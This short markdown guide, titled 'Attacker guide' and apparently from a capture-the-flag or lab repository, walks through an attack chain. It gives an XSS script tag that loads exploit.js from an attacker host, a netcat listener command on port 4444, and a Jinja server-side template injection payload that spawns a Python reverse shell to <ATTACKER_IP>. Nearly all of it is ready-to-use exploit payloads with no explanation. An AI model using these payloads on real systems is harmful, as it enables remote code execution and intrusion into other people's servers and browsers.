# Attacker guide

### Setup exploit script:
Change ATTACKER_IP in exploit.js

### Host exploit server:

```sh
python3 attacker.py
```

### XSS payload:

```html
<script src="http://<attacker_ip>/exploit.js"></script>
```

### Setup a listener:

```sh
nc -lvnp 4444
```

### SSTI payload:

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'').read() }}
```
